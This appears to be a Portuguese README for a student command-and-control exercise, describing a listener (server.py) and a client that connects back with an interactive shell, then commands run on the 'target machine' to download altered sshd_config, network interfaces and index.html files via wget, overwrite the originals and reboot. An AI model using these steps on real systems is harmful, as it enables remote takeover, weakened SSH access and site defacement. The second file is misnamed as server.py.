Olá, este repositório é para explicar o que fazer com o CheckPoint 01 Python - Command Control

Acima estão dois arquivos: server.py & cliente.py

O primeiro arquivo que temos que utilizar é o server.py:
  Nesse arquivo, já está detalhado o que cada parte faz/recebe
  Temos que dar um run nele primeiro, pois ele vai abrir uma porta na máquina e ficar escutando 
 
Então agora utilizaremos o arquivo server.py:
  Ele vai se conectar na porta escolhida pelo server.py e se conectar
  levando os arquivos escolhidos e uma shell interativa
  
  
Após rodar os dois e fazer as devidas modificações nos documentos, vamos dar a seguinte sequência de comandos:
  na nossa máquina, vamos levar os 3 documentos alterados para a pasta de rede e subir uma rede
    No Kali, por exemplo, essa pasta é /var/www/html
    
  Feito isso, no cmd que recebemos, vamos dar o comando:
    "wget "http://localhost/sshd_config" -O arquivo1alterado"
    "wget "http://localhost/interfaces" -O arquivo2alterado"
    "wget "http://localhost/index.html" -O arquivo3alterado"
    
  Com isso, já vamos ter os arquivos alterados na máquina alvo.
  Para substituir os arquivos originais pelos arquivos alterados, damos o seguinte comando:
    "mv arquivo1alterado /etc/ssh/sshd_config"
    "mv arquivo2alterado /etc/network/interfaces"
    "mv arquivo3alterado /var/www/html/index.html"
    
  Agora os arquivos estão substituídos, vamos dar o comando para reiniciar a máquina alvo para concluir as alterações
    "reboot"
